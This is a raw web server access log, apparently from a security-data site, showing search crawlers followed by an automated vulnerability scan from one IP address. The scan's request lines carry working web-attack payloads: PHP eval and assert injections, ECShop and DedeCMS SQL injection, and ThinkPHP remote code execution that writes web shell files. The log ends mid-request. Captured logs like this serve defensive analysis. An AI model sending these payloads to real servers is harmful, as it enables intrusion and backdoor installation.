114.119.149.71 - - [20/Oct/2021:02:55:36 -0700] "GET /self.logs/access.log.2019-10-14.gz HTTP/1.1" 200 26064 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
216.244.66.245 - - [20/Oct/2021:02:58:54 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
223.70.245.4 - - [20/Oct/2021:02:59:25 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
114.119.135.212 - - [20/Oct/2021:03:01:03 -0700] "GET /self.logs/2015/error.log.2015-04-12.gz HTTP/1.1" 200 1005 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
216.244.66.245 - - [20/Oct/2021:03:03:33 -0700] "GET /self.logs/error.log.2021-08-19.gz HTTP/1.1" 200 2358 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:03:03:37 -0700] "GET /self.logs/error.log.2021-08-24.gz HTTP/1.1" 200 1318 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:03:04:52 -0700] "GET /maccdc2012/ssl.log.gz HTTP/1.1" 200 1311442 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
114.119.149.89 - - [20/Oct/2021:03:06:30 -0700] "GET /self.logs/access.log.2018-04-30.gz HTTP/1.1" 200 16931 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
216.244.66.245 - - [20/Oct/2021:03:06:35 -0700] "GET /self.logs/error.log.2020-02-14 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
51.222.253.9 - - [20/Oct/2021:03:07:06 -0700] "GET /Datasets%20Description/Network/?C=N;O=D HTTP/1.1" 200 721 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [20/Oct/2021:03:07:06 -0700] "GET /self.logs/error.log.2020-03-22 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:03:07:34 -0700] "GET /self.logs/error.log.2020-06-08 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
114.119.149.90 - - [20/Oct/2021:03:11:52 -0700] "GET /self.logs/error.log.2018-08-28.gz HTTP/1.1" 200 7044 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
118.184.177.111 - - [20/Oct/2021:03:20:01 -0700] "GET / HTTP/1.1" 301 438 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
118.184.177.111 - - [20/Oct/2021:03:21:06 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.135.212 - - [20/Oct/2021:03:28:05 -0700] "GET /self.logs/error.log.2020-05-16 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.78 - - [20/Oct/2021:03:33:32 -0700] "GET /self.logs/2015/access.log.2015-12-26.gz HTTP/1.1" 200 3881 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.71 - - [20/Oct/2021:03:38:54 -0700] "GET /self.logs/access.log.2020-06-24.gz HTTP/1.1" 200 10120 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
110.172.131.212 - - [20/Oct/2021:03:39:37 -0700] "GET /self.logs/ HTTP/1.1" 200 32323 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0" 
110.172.131.212 - - [20/Oct/2021:03:39:38 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0" 
216.244.66.245 - - [20/Oct/2021:03:47:39 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
114.119.135.212 - - [20/Oct/2021:03:49:40 -0700] "GET /self.logs/access.log.2018-11-29.gz HTTP/1.1" 200 23296 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
216.244.66.245 - - [20/Oct/2021:03:51:51 -0700] "GET /self.logs/access.log.2021-09-30.gz HTTP/1.1" 200 71377 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
162.213.248.48 - - [20/Oct/2021:03:52:42 -0700] "GET /wordpress/ HTTP/1.1" 301 439 "-" "-" 
114.119.149.90 - - [20/Oct/2021:03:55:05 -0700] "GET /self.logs/error.log.2019-10-07 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
216.244.66.245 - - [20/Oct/2021:03:55:18 -0700] "GET /self.logs/error.log.2020-04-06 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:03:57:29 -0700] "GET /Datasets%20Description/?C=D;O=A HTTP/1.1" 200 1128 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
114.119.149.89 - - [20/Oct/2021:04:16:47 -0700] "GET /self.logs/2015/access.log.2015-10-17.gz HTTP/1.1" 200 4673 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
51.222.253.8 - - [20/Oct/2021:04:23:00 -0700] "GET /self.logs/?C=N;O=D HTTP/1.1" 200 32993 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
114.119.135.212 - - [20/Oct/2021:04:27:38 -0700] "GET /self.logs/error.log.2019-09-10.gz HTTP/1.1" 200 1222 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.81 - - [20/Oct/2021:04:32:57 -0700] "GET /self.logs/access.log.2017-01-04.gz HTTP/1.1" 200 33864 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
216.244.66.245 - - [20/Oct/2021:04:35:33 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:04:39:52 -0700] "GET /self.logs/access.log.2021-07-13.gz HTTP/1.1" 200 30961 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:04:40:01 -0700] "GET /self.logs/error.log.2021-08-20 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:04:40:06 -0700] "GET /self.logs/error.log.2021-09-01.gz HTTP/1.1" 200 1524 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:04:41:19 -0700] "GET /tg/c.zip HTTP/1.1" 200 1462920 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:04:43:10 -0700] "GET /self.logs/error.log.2020-05-10 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:04:43:15 -0700] "GET /self.logs/error.log.2020-06-02 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
114.119.149.89 - - [20/Oct/2021:04:43:48 -0700] "GET /self.logs/access.log.2017-03-30.gz HTTP/1.1" 200 15783 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
216.244.66.245 - - [20/Oct/2021:04:45:21 -0700] "GET /self.logs/2015/?C=N;O=D HTTP/1.1" 200 66915 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
207.46.13.181 - - [20/Oct/2021:04:46:56 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/?C=S;O=A HTTP/1.1" 200 818 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
114.119.149.78 - - [20/Oct/2021:04:54:36 -0700] "GET /self.logs/access.log.2017-03-03.gz HTTP/1.1" 200 18289 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.71 - - [20/Oct/2021:05:00:02 -0700] "GET /self.logs/access.log.2020-07-02.gz HTTP/1.1" 200 10412 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
51.222.253.7 - - [20/Oct/2021:05:00:56 -0700] "GET / HTTP/1.1" 200 13141 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
31.13.103.117 - - [20/Oct/2021:05:02:07 -0700] "GET / HTTP/1.1" 206 13197 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" 
31.13.103.24 - - [20/Oct/2021:05:02:07 -0700] "GET / HTTP/1.1" 206 13197 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" 
114.119.149.89 - - [20/Oct/2021:05:05:28 -0700] "GET /self.logs/access.log.2019-11-14.gz HTTP/1.1" 200 16371 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.71 - - [20/Oct/2021:05:10:53 -0700] "GET /self.logs/2015/error.log.2015-03-29.gz HTTP/1.1" 200 901 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
66.249.83.16 - - [20/Oct/2021:05:12:18 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.83.87 - - [20/Oct/2021:05:12:19 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.83.87 - - [20/Oct/2021:05:12:19 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
114.119.135.212 - - [20/Oct/2021:05:21:42 -0700] "GET /self.logs/access.log.2018-12-08.gz HTTP/1.1" 200 20425 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
216.244.66.245 - - [20/Oct/2021:05:24:34 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
114.119.149.71 - - [20/Oct/2021:05:26:54 -0700] "GET /self.logs/error.log.2018-06-03.gz HTTP/1.1" 200 4944 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
216.244.66.245 - - [20/Oct/2021:05:28:37 -0700] "GET /self.logs/access.log.2021-07-26.gz HTTP/1.1" 200 17810 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:05:28:51 -0700] "GET /self.logs/access.log.2021-08-03.gz HTTP/1.1" 200 46220 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:05:31:35 -0700] "GET /self.logs/error.log.2020-02-06 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:05:31:38 -0700] "GET /self.logs/error.log.2020-04-18 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
114.119.149.71 - - [20/Oct/2021:05:32:09 -0700] "GET /self.logs/access.log.2020-01-30.gz HTTP/1.1" 200 13067 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
185.191.171.17 - - [20/Oct/2021:05:34:17 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
185.191.171.20 - - [20/Oct/2021:05:34:17 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/ssl.html HTTP/1.1" 200 1823 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
118.113.51.105 - - [20/Oct/2021:05:48:28 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
114.119.149.71 - - [20/Oct/2021:05:53:01 -0700] "GET /self.logs/error.log.2020-09-30 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.90 - - [20/Oct/2021:05:58:14 -0700] "GET /self.logs/2015/access.log.2015-05-06.gz HTTP/1.1" 200 6673 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
207.46.13.26 - - [20/Oct/2021:05:58:32 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
114.119.149.81 - - [20/Oct/2021:06:03:30 -0700] "GET /self.logs/error.log.2020-11-28 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
219.74.97.4 - - [20/Oct/2021:06:04:59 -0700] "GET / HTTP/1.1" 200 13184 "-" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:04:59 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:04:59 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:05:00 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:05:00 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:08:10 -0700] "GET /self.logs/ HTTP/1.1" 200 32341 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:08:11 -0700] "GET /favicon.ico HTTP/1.1" 200 368 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
114.119.149.89 - - [20/Oct/2021:06:08:44 -0700] "GET /self.logs/access.log.2020-07-30.gz HTTP/1.1" 200 13139 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
219.74.97.4 - - [20/Oct/2021:06:10:39 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 206 1912462 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:10:38 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 1582640 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:10:39 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 206 1232462 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
216.244.66.245 - - [20/Oct/2021:06:12:23 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
89.40.73.14 - - [20/Oct/2021:06:12:28 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 328 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:28 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 305 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:28 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 305 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:28 -0700] "GET /plus/moon.php HTTP/1.1" 404 305 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:28 -0700] "POST /plus/90sec.php HTTP/1.1" 418 746 "http://www.secrepo.com/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:28 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 418 746 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:29 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 418 746 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:29 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 418 746 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:29 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 418 746 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:29 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 305 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:29 -0700] "GET /user.php?act=login HTTP/1.1" 404 305 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:30 -0700] "POST /fdgq.php HTTP/1.1" 418 746 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:30 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=nuogx.php&content=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E HTTP/1.1" 418 746 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=nuogx.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:30 -0700] "POST /nuogx.php HTTP/1.1" 418 746 "http://www.secrepo.com/nuogx.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:30 -0700] "GET /user.php?act=login HTTP/1.1" 404 305 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:30 -0700] "POST /ysyqq.php HTTP/1.1" 418 746 "http://www.secrepo.com/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:30 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=iyygj.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E$ HTTP/1.1" 418 746 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=iyygj.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:30 -0700] "POST /iyygj.php HTTP/1.1" 418 746 "http://www.secrepo.com/iyygj.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:31 -0700] "GET /plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%